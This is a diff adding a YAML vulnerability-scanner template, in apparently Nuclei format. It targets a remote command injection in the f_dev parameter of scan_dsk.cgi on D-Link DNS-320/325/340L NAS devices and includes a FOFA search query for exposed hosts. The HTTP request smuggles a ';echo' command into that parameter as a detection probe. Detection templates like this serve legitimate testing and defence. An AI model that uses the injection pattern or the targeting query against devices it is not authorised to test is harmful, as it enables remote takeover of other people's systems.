@@ -1,0 +1,24 @@
+id: d-link-nas-scan_dsk-rce
+
+info:
+  name: "D-Link NAS scan_dsk.cgi ScanDisk_run_e2fsck 函数远程命令注入漏洞"
+  author: 0dayPoc
+  severity: high
+  description: |-
+    fofa: app="D_Link-DNS-ShareCenter"
+          D-Link DNS-320系列NAS设备中scan_dsk.cgi组件的ScanDisk_run_e2fsck函数存在参数校验缺陷。攻击者可通过构造恶意f_dev参数注入任意shell命令实现远程代码执行。FOFA数据表明当前互联网暴露面存在超过6万台受影响设备。建议采取设备下架或网络隔离措施。受影响版本包括DNS-320 V1.00、DNS-320LW V1.01.0914.2012、DNS-325 V1.01/V1.02以及DNS-340L V1.08
+  tags: D-Link
+
+http:
+- raw:
+  - |
+    GET /cgi-bin/scan_dsk.cgi?cmd=ScanDisk_run_e2fsck&f_dev=a;echo%20NdayTest; HTTP/1.1
+    Host: {{Hostname}}
+  matchers-condition: and
+  matchers:
+  - type: status
+    status: [200]
+  - type: word
+    part: body
+    words:
+    - 'NdayTest'
